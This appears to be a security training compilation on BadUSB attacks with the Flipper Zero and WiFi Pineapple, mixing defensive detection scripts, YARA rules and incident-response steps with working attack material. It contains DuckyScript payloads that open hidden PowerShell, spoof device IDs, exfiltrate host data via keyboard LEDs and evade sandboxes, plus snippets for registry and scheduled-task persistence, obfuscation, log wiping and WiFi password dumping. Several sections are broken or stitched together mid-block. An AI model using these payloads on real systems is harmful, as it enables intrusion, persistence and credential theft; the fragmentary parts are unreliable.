# DEFENSIVE TECHNIQUES: DETECTION AND RESPONSE

## Detecting BadUSB Attacks

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ DEFENSIVE MONITORING: USB DEVICE DETECTION                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ KEY INDICATORS OF BADUSB ATTACKS:                                            │
│                                                                              │
│ 1. TYPING SPEED ANALYSIS                                                     │
│ ───────────────────────                                                      │
│ Human typing: 40-100 WPM (4-10 chars/second)                                │
│ BadUSB typing: 500-1000+ chars/second                                        │
│                                                                              │
│ DETECTION SCRIPT (PowerShell):                                               │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ # Monitor for rapid keystroke bursts                              │      │
│ │ # Deploy as scheduled task or background service                   │      │
│ │                                                                    │      │
│ │ $keystrokeThreshold = 50  # chars per second                      │      │
│ │ $monitorWindow = 1000     # milliseconds                          │      │
│ │                                                                    │      │
│ │ # If keystroke rate exceeds threshold, alert                      │      │
│ │ # Requires additional implementation with low-level hooks         │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ 2. USB DEVICE INSERTION MONITORING                                           │
│ ──────────────────────────────────                                           │
│ Watch for new USB HID devices connecting                                     │
│                                                                              │
│ WINDOWS EVENT LOG QUERIES:                                                   │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ # Find USB device connections (Security Log)                      │      │
│ │ Get-WinEvent -FilterHashtable @{                                   │      │
│ │     LogName = 'Security'                                           │      │
│ │     ID = 6416  # PnP Device connected                             │      │
│ │ } | Where-Object {                                                 │      │
│ │     $_.Message -match "Keyboard"                                   │      │
│ │ }                                                                   │      │
│ │                                                                    │      │
│ │ # System Log alternative                                           │      │
│ │ Get-WinEvent -FilterHashtable @{                                   │      │
│ │     LogName = 'System'                                             │      │
│ │     ProviderName = 'Microsoft-Windows-Kernel-PnP'                 │      │
│ │ } | Where-Object {                                                 │      │
│ │     $_.Message -match "HID"                                        │      │
│ │ }                                                                   │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ 3. POWERSHELL EXECUTION MONITORING                                           │
│ ──────────────────────────────────                                           │
│ BadUSB attacks almost always involve PowerShell or CMD                       │
│                                                                              │
│ SUSPICIOUS PATTERNS:                                                         │
│ • powershell.exe with -w hidden, -WindowStyle Hidden                        │
│ • powershell.exe with -ep bypass, -ExecutionPolicy Bypass                   │
│ • powershell.exe with -enc, -EncodedCommand (Base64)                        │
│ • cmd.exe /c with long command lines                                        │
│ • Rapid succession of process creation events                               │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## File Integrity Monitoring

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ DETECTING FILE CHANGES AND MALWARE ARTIFACTS                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ TECHNIQUE: BASELINE AND COMPARE                                              │
│ ─────────────────────────────                                                │
│ Create hash of critical files, detect when they change                       │
│                                                                              │
│ POWERSHELL FILE INTEGRITY MONITOR:                                           │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ # Create baseline of critical directories                         │      │
│ │ $watchPaths = @(                                                   │      │
│ │     "$env:TEMP",                                                   │      │
│ │     "$env:APPDATA",                                                │      │
│ │     "$env:LOCALAPPDATA",                                           │      │
│ │     "C:\Windows\System32"                                          │      │
│ │ )                                                                   │      │
│ │                                                                    │      │
│ │ # Generate baseline hashes                                         │      │
│ │ $baseline = @{}                                                    │      │
│ │ foreach ($path in $watchPaths) {                                   │      │
│ │     Get-ChildItem $path -Recurse -File -EA 0 | ForEach-Object {   │      │
│ │         $hash = (Get-FileHash $_.FullName -EA 0).Hash             │      │
│ │         $baseline[$_.FullName] = @{                                │      │
│ │             Hash = $hash                                           │      │
│ │             Modified = $_.LastWriteTime                           │      │
│ │             Size = $_.Length                                       │      │
│ │         }                                                          │      │
│ │     }                                                              │      │
│ │ }                                                                   │      │
│ │                                                                    │      │
│ │ # Save baseline                                                    │      │
│ │ $baseline | Export-Clixml "C:\Security\baseline.xml"              │      │
│ │                                                                    │      │
│ │ # Later: Compare current state to baseline                        │      │
│ │ $current = @{} # (same collection logic)                          │      │
│ │ $changes = Compare-Object $baseline.Keys $current.Keys            │      │
│ │ # Report new files, deleted files, modified files                 │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ KEY FILES TO MONITOR FOR BADUSB ARTIFACTS:                                   │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ Location                          │ Why It Matters                  │     │
│ ├───────────────────────────────────┼─────────────────────────────────┤     │
│ │ %TEMP%\*.txt, *.ps1               │ Common payload output location  │     │
│ │ %APPDATA%\*.exe, *.ps1            │ Persistence/dropped files       │     │
│ │ %STARTUP%\ (user startup folder)  │ Persistence mechanism           │     │
│ │ Registry Run keys                 │ Persistence mechanism           │     │
│ │ Scheduled Tasks                   │ Persistence mechanism           │     │
│ └───────────────────────────────────┴─────────────────────────────────┘     │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Malware Signature Detection

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ DETECTING KNOWN BADUSB PAYLOAD PATTERNS                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ COMMON BADUSB PAYLOAD SIGNATURES:                                            │
│                                                                              │
│ POWERSHELL DETECTION SCRIPT:                                                 │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ # Scan for BadUSB payload indicators                              │      │
│ │                                                                    │      │
│ │ $indicators = @{                                                   │      │
│ │     # PowerShell-based payloads                                   │      │
│ │     "WiFiExtractor" = @(                                          │      │
│ │         "netsh wlan show profile.*key=clear",                     │      │
│ │         "wifi.*password.*out-file"                                │      │
│ │     )                                                              │      │
│ │     "SystemRecon" = @(                                            │      │
│ │         "Get-WmiObject.*Win32_OperatingSystem",                   │      │
│ │         "Get-NetIPAddress.*Out-File"                              │      │
│ │     )                                                              │      │
│ │     "CredentialHarvest" = @(                                      │      │
│ │         "Get-Credential",                                          │      │
│ │         "PromptForCredential"                                      │      │
│ │     )                                                              │      │
│ │     "ReverseShell" = @(                                           │      │
│ │         "System.Net.Sockets.TCPClient",                           │      │
│ │         "New-Object.*TCPClient",                                  │      │
│ │         "Invoke-Expression.*stream.Read"                          │      │
│ │     )                                                              │      │
│ │     "Persistence" = @(                                            │      │
│ │         "New-ScheduledTask",                                       │      │
│ │         "Register-ScheduledTask",                                  │      │
│ │         "Set-ItemProperty.*CurrentVersion\\Run"                   │      │
│ │     )                                                              │      │
│ │ }                                                                   │      │
│ │                                                                    │      │
│ │ # Scan PowerShell logs for indicators                             │      │
│ │ $psLogs = Get-WinEvent -FilterHashtable @{                        │      │
│ │     LogName = 'Microsoft-Windows-PowerShell/Operational'          │      │
│ │     ID = 4104  # Script Block Logging                             │      │
│ │ } -EA 0                                                            │      │
│ │                                                                    │      │
│ │ foreach ($log in $psLogs) {                                        │      │
│ │     foreach ($category in $indicators.Keys) {                      │      │
│ │         foreach ($pattern in $indicators[$category]) {            │      │
│ │             if ($log.Message -match $pattern) {                    │      │
│ │                 Write-Warning "DETECTED: $category - $pattern"    │      │
│ │                 # Log/Alert/Response action here                  │      │
│ │             }                                                      │      │
│ │         }                                                          │      │
│ │     }                                                              │      │
│ │ }                                                                   │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ YARA RULE EXAMPLE FOR BADUSB SCRIPTS:                                        │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ rule BadUSB_WiFi_Extractor {                                      │      │
│ │     meta:                                                          │      │
│ │         description = "Detects WiFi password extraction scripts"  │      │
│ │         author = "Security Team"                                   │      │
│ │     strings:                                                       │      │
│ │         $s1 = "netsh wlan show profile" nocase                    │      │
│ │         $s2 = "key=clear" nocase                                  │      │
│ │         $s3 = "Key Content" nocase                                │      │
│ │         $s4 = "wifi" nocase                                       │      │
│ │         $s5 = "password" nocase                                   │      │
│ │     condition:                                                     │      │
│ │         ($s1 and $s2) or ($s3 and ($s4 or $s5))                  │      │
│ │ }                                                                   │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## USB Device Control Policies

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ PREVENTIVE CONTROLS: USB RESTRICTIONS                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ WINDOWS GROUP POLICY USB CONTROLS:                                           │
│                                                                              │
│ 1. BLOCK ALL USB STORAGE (but allow keyboards/mice):                        │
│    Computer Configuration > Administrative Templates >                       │
│    System > Removable Storage Access                                         │
│    → "All Removable Storage: Deny all access" = Enabled                     │
│                                                                              │
│ 2. WHITELIST SPECIFIC DEVICES:                                               │
│    Computer Configuration > Administrative Templates >                       │
│    System > Device Installation > Device Installation Restrictions          │
│    → "Prevent installation of devices not described by other policy"       │
│    → Then whitelist specific VID/PIDs                                        │
│                                                                              │
│ POWERSHELL USB MONITORING:                                                   │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ # Real-time USB device monitoring                                 │      │
│ │ # Alert on any new HID keyboard device                           │      │
│ │                                                                    │      │
│ │ $query = "SELECT * FROM __InstanceCreationEvent " +               │      │
│ │          "WITHIN 2 " +                                             │      │
│ │          "WHERE TargetInstance ISA 'Win32_Keyboard'"              │      │
│ │                                                                    │      │
│ │ Register-WmiEvent -Query $query -Action {                         │      │
│ │     $device = $Event.SourceEventArgs.NewEvent.TargetInstance     │      │
│ │     $msg = "NEW KEYBOARD DETECTED: $($device.Description)"       │      │
│ │     Write-EventLog -LogName Application -Source "USBMonitor" `   │      │
│ │         -EventId 1000 -Message $msg -EntryType Warning           │      │
│ │     # Additional actions: email alert, lock workstation, etc.   │      │
│ │ }                                                                   │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ ENDPOINT DETECTION RULES:                                                    │
│ Many EDR solutions can detect BadUSB patterns:                               │
│ • CrowdStrike Falcon: Custom IOA rules for USB + rapid typing              │
│ • Carbon Black: Watchlist for suspicious PowerShell from explorer.exe      │
│ • Microsoft Defender ATP: Custom detection rules                            │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Flipper Zero Fundamentals

### Complete Command Reference

#### Core Commands
| Command | Parameters | Description |
|---------|------------|-------------|
| `REM` | text | Comment line (ignored) |
| `DELAY` | ms | Pause execution |
| `DEFAULT_DELAY` | ms | Delay before each command |
| `STRING` | text | Type text string |
| `STRINGLN` | text | Type text + ENTER |
| `ENTER` | - | Press Enter key |

#### Modifier Keys
| Command | Aliases | Notes |
|---------|---------|-------|
| `CTRL` | `CONTROL` | Control key |
| `SHIFT` | - | Shift key |
| `ALT` | - | Alt key |
| `GUI` | `WINDOWS` | Windows/Command key |

#### Special Keys
```
ESCAPE/ESC, BACKSPACE, TAB, SPACE, DELETE, INSERT
HOME, END, PAGEUP, PAGEDOWN
UP/UPARROW, DOWN/DOWNARROW, LEFT/LEFTARROW, RIGHT/RIGHTARROW
CAPSLOCK, NUMLOCK, SCROLLLOCK, PRINTSCREEN
PAUSE/BREAK, MENU/APP, F1-F12
```

#### Flipper Exclusive Commands
| Command | Parameters | Description |
|---------|------------|-------------|
| `ID` | VID:PID Mfg:Prod | USB device spoofing |
| `HOLD` | key | Hold key down |
| `RELEASE` | key | Release held key |
| `STRING_DELAY` | ms | Delay for next STRING |
| `DEFAULT_STRING_DELAY` | ms | Delay between all chars |
| `ALTCHAR` | code | ALT+Numpad character |
| `ALTSTRING` | text | Full string via ALT codes |
| `SYSRQ` | char | Linux SysRq command |
| `MEDIA` | key | Media control key |
| `GLOBE` | key | Mac Globe/Fn key |
| `MOUSEMOVE` | x y | Move mouse cursor |
| `LEFTCLICK` | - | Left mouse button |
| `RIGHTCLICK` | - | Right mouse button |
| `MOUSESCROLL` | delta | Scroll wheel |
| `WAIT_FOR_BUTTON_PRESS` | - | Pause for operator |
| `REPEAT` | n | Repeat last command |

## FZ Basic Level Scripts

### Skill Level: BASIC
**Characteristics:**
- 5-20 lines of code
- Single purpose/action
- Fixed delays
- No error handling
- Direct, observable execution

### [FZ-B01] Hello World - Windows Notepad

```
REM =============================================
REM BASIC: Hello World - Windows
REM Target: Windows 10/11
REM Action: Opens Notepad, types message
REM Skill: Basic
REM =============================================

DELAY 2000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1000
STRING Hello from Flipper Zero!
```

**Line-by-Line Analysis:**
| Line | Command | Purpose |
|------|---------|---------|
| 1-6 | REM | Documentation header |
| 7 | DELAY 2000 | Wait for USB enumeration (2 sec) |
| 8 | GUI r | Open Run dialog (Win+R) |
| 9 | DELAY 500 | Wait for dialog to appear |
| 10 | STRING notepad | Type application name |
| 11 | ENTER | Launch application |
| 12 | DELAY 1000 | Wait for Notepad to load |
| 13 | STRING... | Type the message |

```

│ SECOND 0-2: Nothing happens                                                  │

│   │                                    │                                    │
│   │     Normal desktop (unchanged)     │                                    │
│   │                                    │                                    │
│   └────────────────────────────────────┘                                    │
│   User might notice USB connection notification                             │
│                                                                              │
│ SECOND 2: Run dialog appears suddenly                                        │
│   ┌────────────────────────────────────┐                                    │
│   │           ┌─────────────┐          │                                    │
│   │           │ Run      X  │          │                                    │
│   │           │ Open: [  ]  │          │                                    │
│   │           └─────────────┘          │                                    │
│   └────────────────────────────────────┘                                    │

│   │           │ Open: [notepad]  │     │                                    │
│   └────────────────────────────────────┘                                    │

│                                                                              │
│ SECOND 2.5-3.5: Notepad window opens                                        │

│   │ *Untitled - Notepad             X  │                                    │

│   │                                    │                                    │

│                                                                              │

│ "I just plugged in a USB device and suddenly Notepad opened and             │
│  typed a message by itself! That was weird and fast."                        │

│ TOTAL EXECUTION TIME: ~3.5 seconds                                           │

```

**Why This Script is Perfect for Learning:**
- Simple and visible - you can SEE what happened
- Non-destructive - just opens Notepad with text
- Teaches fundamental concepts: delays, GUI shortcuts, STRING typing
- Great for testing your Flipper Zero is working correctly

### [FZ-B02] Hello World - macOS TextEdit

```
REM =============================================
REM BASIC: Hello World - macOS
REM Target: macOS 12+
REM Action: Opens TextEdit via Spotlight
REM Skill: Basic
REM =============================================

DELAY 2000
GUI SPACE
DELAY 700
STRING textedit
DELAY 500
ENTER
DELAY 1500
STRING Hello from Flipper Zero on Mac!
```

**macOS Notes:**
- `GUI SPACE` opens Spotlight search
- Longer delays needed for application launch
- TextEdit may open with formatting toolbar

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 🍎 HOW THIS DIFFERS FROM WINDOWS                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ WINDOWS:                              macOS:                                 │
│ ────────                              ──────                                 │
│ GUI r = Opens Run dialog              GUI SPACE = Opens Spotlight           │
│                                                                              │
│ ┌──────────────────┐                 ┌────────────────────────────┐         │
│ │ Run           X  │                 │    🔍 [                  ] │         │
│ │ Open: [      ]   │                 │    Spotlight Search        │         │
│ └──────────────────┘                 └────────────────────────────┘         │
│                                                                              │
│ WHY SPOTLIGHT?                                                               │
│ - macOS doesn't have a "Run" dialog like Windows                            │
│ - Spotlight is the universal launcher (like Windows Search)                 │
│ - GUI SPACE = Command+Space keyboard shortcut                               │
│ - Type app name → shows results → ENTER launches                            │
│                                                                              │
│ TIMING DIFFERENCES:                                                          │
│ - macOS apps often take longer to launch than Windows                       │
│ - TextEdit needs ~1500ms vs Notepad's ~1000ms                              │
│ - Extra DELAY 500 before ENTER lets Spotlight index the app                │
│                                                                              │
│ ON TARGET MAC:                                                               │
│ ┌─────────────────────────────────────────────────────────────┐             │
│ │ ┌───────────────────────────────────────────────────┐       │             │
│ │ │ 🔍 [textedit                                   ]  │       │             │
│ │ │  ────────────────────────────────────────────────  │       │             │
│ │ │  📝 TextEdit                          Application  │       │             │
│ │ │  📁 TextEdit Preferences              File         │       │             │
│ │ └───────────────────────────────────────────────────┘       │             │
│ │                                                              │             │
│ │ Spotlight shows matching results before you even press ENTER │             │
│ └─────────────────────────────────────────────────────────────┘             │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### [FZ-B03] Hello World - Linux Terminal

```
REM =============================================
REM BASIC: Hello World - Linux
REM Target: Ubuntu/Debian with GNOME
REM Action: Opens terminal, echoes message
REM Skill: Basic
REM =============================================

DELAY 2000
CTRL ALT t
DELAY 1000
STRINGLN echo "Hello from Flipper Zero on Linux!"
```

**Linux Notes:**
- `CTRL ALT t` is GNOME default terminal shortcut
- KDE uses `CTRL ALT t` or `F12` (Yakuake)
- XFCE may use different shortcuts

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 🐧 LINUX: THE DIRECT APPROACH                                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ WHY LINUX IS DIFFERENT:                                                      │
│ - Linux uses CTRL+ALT+T as the standard terminal shortcut (GNOME/KDE)       │
│ - No "Run dialog" needed - terminal IS the command interface                │
│ - Commands execute immediately with STRINGLN (includes Enter)              │
│                                                                              │
│ THE COMMAND EXPLAINED:                                                       │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ echo "Hello from Flipper Zero on Linux!"                          │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│   echo    = Built-in command that outputs text                              │
│   "..."   = The message to display                                          │
│   Result  = Message appears in terminal, then new prompt                    │
│                                                                              │
│ ON TARGET LINUX SYSTEM:                                                      │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ user@ubuntu:~$                                                      │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                     ↓ CTRL+ALT+T pressed                                    │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ Terminal - user@ubuntu                                          X  │      │
│ │──────────────────────────────────────────────────────────────────│      │
│ │ user@ubuntu:~$ echo "Hello from Flipper Zero on Linux!"          │      │
│ │ Hello from Flipper Zero on Linux!                                 │      │
│ │ user@ubuntu:~$ _                                                  │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ IMPORTANT VARIATIONS BY DESKTOP ENVIRONMENT:                                │
│ ┌────────────────┬─────────────────────────────────────────────────┐        │
│ │ GNOME (Ubuntu) │ CTRL+ALT+T works                                │        │
│ │ KDE (Kubuntu)  │ CTRL+ALT+T works, or F12 for Yakuake dropdown  │        │
│ │ XFCE (Xubuntu) │ Often needs configuration, try Super+T          │        │
│ │ Cinnamon       │ CTRL+ALT+T works                                │        │
│ │ MATE           │ CTRL+ALT+T works                                │        │
│ └────────────────┴─────────────────────────────────────────────────┘        │
│                                                                              │
│ ⚠️ COMPATIBILITY NOTE:                                                       │
│ If the target uses a non-standard desktop, the terminal might not open!    │
│ More robust: Use GUI then type "gnome-terminal" or "xterm"                 │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### [FZ-B05] Open Website - Windows

```
REM =============================================
REM BASIC: Open Website

REM Action: Opens default browser to URL
REM Skill: Basic
REM =============================================

DELAY 2000
```

```
STRINGLN Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
STRINGLN Clear-History
STRINGLN exit
```

### [FZ-E01] Keystroke Reflection Exfiltration

```
REM =============================================
REM EXPERT: Keystroke Reflection Attack
REM Target: Windows 10/11
REM Action: Exfiltrates data via HID keyboard LEDs
REM Skill: Expert
REM Theory: Uses CAPSLOCK/NUMLOCK reflection as
REM         covert data channel
REM =============================================

ID 05ac:024f Apple Inc:Apple Keyboard

DELAY 3000

REM This demonstrates the concept - full implementation
REM requires custom Flipper firmware to read LED states

GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 2000

REM Prepare data
STRINGLN $data = "$env:COMPUTERNAME|$env:USERNAME"
STRINGLN $binary = [System.Text.Encoding]::UTF8.GetBytes($data)

REM Convert to binary string
STRINGLN $bits = ($binary | ForEach-Object { [Convert]::ToString($_,2).PadLeft(8,'0') }) -join ''

REM Signal start
STRINGLN $wsh = New-Object -ComObject WScript.Shell

REM Transmit via CAPSLOCK toggles (1 = toggle, 0 = wait)
REM Each bit transmitted with timing
STRINGLN foreach ($bit in $bits.ToCharArray()) {
STRINGLN     if ($bit -eq '1') {
STRINGLN         $wsh.SendKeys('{CAPSLOCK}')
STRINGLN     }
STRINGLN     Start-Sleep -Milliseconds 100
STRINGLN }

REM Signal end (3 rapid toggles)
STRINGLN 1..3 | ForEach-Object { $wsh.SendKeys('{CAPSLOCK}'); Start-Sleep -Milliseconds 50 }
STRINGLN exit
```

```
│  Target PC   │───>│ USB HID LED  │───>│ Flipper Zero │
│  (PowerShell)│    │ (CAPSLOCK)   │    │  (Receiver)  │
└──────────────┘    └──────────────┘    └──────────────┘
       │                   │                    │
   Toggles            LED State            Decodes
```

### [FZ-E05] Anti-Analysis Payload

```
REM =============================================
REM EXPERT: VM/Sandbox Detection
REM Target: Windows 10/11
REM Action: Detects analysis environments
REM Skill: Expert
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 3000

GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 2500

REM === ANTI-VM CHECKS ===
STRINGLN $isVM = $false

REM Check for VM artifacts
STRINGLN $vmArtifacts = @(
STRINGLN     "HKLM:\SOFTWARE\VMware*",
STRINGLN     "HKLM:\SOFTWARE\Oracle\VirtualBox*",
STRINGLN     "HKLM:\SYSTEM\CurrentControlSet\Services\VBox*",
STRINGLN     "HKLM:\SYSTEM\CurrentControlSet\Services\vmci"
STRINGLN )

STRINGLN foreach ($path in $vmArtifacts) {
STRINGLN     if (Test-Path $path) { $isVM = $true; break }
STRINGLN }

REM Check MAC address prefixes (VMware, VirtualBox, etc)
STRINGLN $vmMacs = @("00:0C:29", "00:50:56", "08:00:27", "00:1C:42")
STRINGLN $mac = (Get-NetAdapter | Select -First 1).MacAddress
STRINGLN foreach ($prefix in $vmMacs) {
STRINGLN     if ($mac -like "$prefix*") { $isVM = $true; break }
STRINGLN }

REM Check for analysis tools
STRINGLN $analysisTools = @("wireshark", "procmon", "procexp", "fiddler", "ida", "x64dbg", "ollydbg")
STRINGLN $procs = Get-Process | Select -ExpandProperty Name
STRINGLN foreach ($tool in $analysisTools) {
STRINGLN     if ($procs -contains $tool) { $isVM = $true; break }
STRINGLN }

REM Check CPU cores (sandboxes often have few)
STRINGLN if ((Get-WmiObject Win32_Processor).NumberOfCores -lt 2) { $isVM = $true }

REM Check RAM (sandboxes often have little)
STRINGLN if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 2GB) { $isVM = $true }

REM === CONDITIONAL EXECUTION ===
STRINGLN if (-not $isVM) {
STRINGLN     # Safe to execute - not in VM/sandbox
STRINGLN     $env:COMPUTERNAME | Out-File "$env:TEMP\safe_exec.txt"
STRINGLN } else {
STRINGLN     # In VM - execute decoy or exit
STRINGLN     exit
STRINGLN }
```

### Payload Development Best Practices

#### Timing Optimization
```

DELAY 5000    REM Arbitrary long delay

RIGHT:
DELAY 2000    REM USB enumeration (measured)
DELAY 500     REM Run dialog response (tested)
DELAY 1000    REM Application launch (verified)
```

#### Error Handling
```
REM Basic - No error handling (bad)
STRING powershell
ENTER

REM Better - Silent errors
STRING powershell -w hidden 2>$null

REM Best - Error handling with fallback
STRINGLN try { $result = Get-Content file.txt } catch { $result = "N/A" }
```

#### Modular Design
```
REM Create reusable functions
STRINGLN function Get-SysInfo { @{Host=$env:COMPUTERNAME; User=$env:USERNAME} }

REM Use modules in payload
STRINGLN $info = Get-SysInfo
STRINGLN Save-Data -data $info -file "$env:TEMP\output.json"
```

## FZ Red Team Tactics

### Initial Access Techniques

#### T1091 - Replication Through Removable Media
```
Tactic: Plant USB device for execution
Detection Evasion:
- Spoof legitimate device VID/PID
- Add human-like typing delays
- Use common application names
```

#### T1566.001 - Spearphishing Attachment (USB variant)
```
Tactic: Provide USB to target with "important files"
Payload: Auto-executes on insertion
Social Engineering: "Here are the meeting notes"
```

### Execution Techniques

#### T1059.001 - PowerShell Execution
```
Standard (Detectable):
STRING powershell -c "malicious code"

Evasion:
STRING powershell -w hidden -ep bypass -nop -c "..."
STRING powershell -enc BASE64_ENCODED_COMMAND
```

#### T1059.003 - Windows Command Shell
```
Standard:
STRING cmd /c command

Evasion:
STRING cmd /q /c command 2>nul
```

### Persistence Techniques

#### T1547.001 - Registry Run Keys
```powershell
# Current User (no admin required)
$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $path -Name "Update" -Value "payload.exe"

# Local Machine (requires admin)
$path = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```

#### T1053.005 - Scheduled Task
```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -c code"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "MicrosoftUpdate" -Action $action -Trigger $trigger
```

#### T1546.003 - WMI Event Subscription
```powershell
$filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "ProcessFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'"
}
```

### Defense Evasion Techniques

#### T1027 - Obfuscation
```powershell
# String splitting
$a = "power"; $b = "shell"; Invoke-Expression "$a$b -c code"

# Character substitution
$cmd = "powershell" -replace "o","0" -replace "0","o"

# Base64 encoding
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("code"))
powershell -enc $encoded
```

#### T1070 - Indicator Removal
```powershell
# Clear PowerShell history
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue

# Clear Run MRU
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*"

# Clear recent files
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force
```

### Credential Access Techniques

#### T1003 - OS Credential Dumping
```powershell
# WiFi passwords
netsh wlan show profile name="SSID" key=clear

# Saved credentials
cmdkey /list

# Browser credential locations

```

#### T1056.001 - Keylogging
```
Deploy PowerShell keylogger
Capture for specified duration
Save to temp file for later exfil
```

### Exfiltration Techniques

#### T1048 - Exfiltration Over Alternative Protocol
```
DNS Exfiltration:
- Encode data in subdomain queries
- Send to controlled DNS server
- Reassemble on receiver

Example: base64data.chunk1.exfil.domain.com
```

```
HTTP POST:

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## FZ Blue Team Countermeasures

### Detection Strategies

#### USB Device Monitoring
```
Indicators:
- Rapid keystroke input (>1000 chars/min)
- USB HID device insertion events
- PowerShell execution after USB insertion
- Unusual VID/PID combinations

Detection Tools:
- Windows Event Log (Security 6416)
- USB forensics tools
- EDR USB monitoring
```

#### PowerShell Logging
```
Enable:
- Script Block Logging
- Module Logging  
- Transcription

GPO Path:
Computer Configuration > Administrative Templates > 
Windows Components > Windows PowerShell
```

#### Command Line Auditing
```
Enable Process Creation Events:
- Event ID 4688
- Include command line in process creation events

Detection Queries:
- powershell -w hidden
- powershell -ep bypass
- powershell -enc
- cmd /c with suspicious commands
```

### Prevention Measures

#### USB Device Control
```
Options:
1. Group Policy USB Restrictions
   - Block removable storage
   - Whitelist specific devices
   
2. Endpoint Protection USB Control
   - Device type filtering
   - VID/PID whitelisting
   
3. Physical USB Port Blockers
   - Hardware locks
   - Epoxy filling (extreme)
```

#### Application Whitelisting
```
Technologies:
- Windows Defender Application Control (WDAC)
- AppLocker
- Third-party solutions

Block:
- Unsigned scripts
- Unknown executables
- PowerShell constrained language mode
```

#### Endpoint Detection and Response (EDR)
```
Capabilities:
- Behavioral analysis
- Memory scanning
- Network traffic analysis
- Automated response

Detection Focus:
- Unusual process chains
- Memory-only execution
- Credential access attempts
- Lateral movement patterns
```

### Response Procedures

#### USB Incident Response
```
1. ISOLATE
   - Disconnect device
   - Preserve evidence
   - Network quarantine if needed

2. ANALYZE
   - USB forensic imaging
   - Timeline analysis
   - Payload extraction

3. CONTAIN
   - Identify all affected systems
   - Check for persistence
   - Credential reset if needed

4. ERADICATE
   - Remove malware/persistence
   - Patch vulnerabilities
   - Update controls

5. RECOVER
   - Restore systems
   - Verify integrity
   - Resume operations

6. LESSONS LEARNED
   - Update detection rules
   - Improve controls
   - Security awareness training
```

#### Forensic Analysis
```
USB Analysis:
1. Image the USB device
2. Extract payload files
3. Analyze script contents
4. Identify IOCs

Host Analysis:
1. Memory capture
2. Event log analysis
3. Registry analysis
4. File system timeline
```

## Pager Fundamentals

### Key Differences from Flipper Zero

| Feature | Flipper Zero | WiFi Pineapple Pager |
|---------|--------------|---------------------|
| Primary Function | BadUSB/HID Injection | WiFi Pentesting |
| Payload Language | DuckyScript | DuckyScript + Bash |
| Keystroke Injection | Yes | No |
| Network Attacks | Limited | Extensive |
| File Format | .txt | .sh (bash) |
| Interface | OLED + Buttons | Color LCD + DPAD |
| WiFi Bands | None | 2.4/5/6 GHz Tri-band |

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 📡 UNDERSTANDING THE WIFI PINEAPPLE PAGER                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ The WiFi Pineapple Pager is a COMPLETELY DIFFERENT device from the          │
│ Flipper Zero. While both are used for security testing, they target         │
│ different attack surfaces:                                                   │
│                                                                              │
│ FLIPPER ZERO:                                                                │
│ ┌─────────────────────────────────────────────────────────────────┐         │
│ │ TARGET: The computer it's plugged into                          │         │
│ │ METHOD: Pretends to be a keyboard, types commands               │         │
│ │ RESULT: Runs malicious commands on victim's computer            │         │
│ │                                                                  │         │
│ │    [Flipper] ──USB──► [Computer]                                │         │
│ │                         Types commands                          │         │
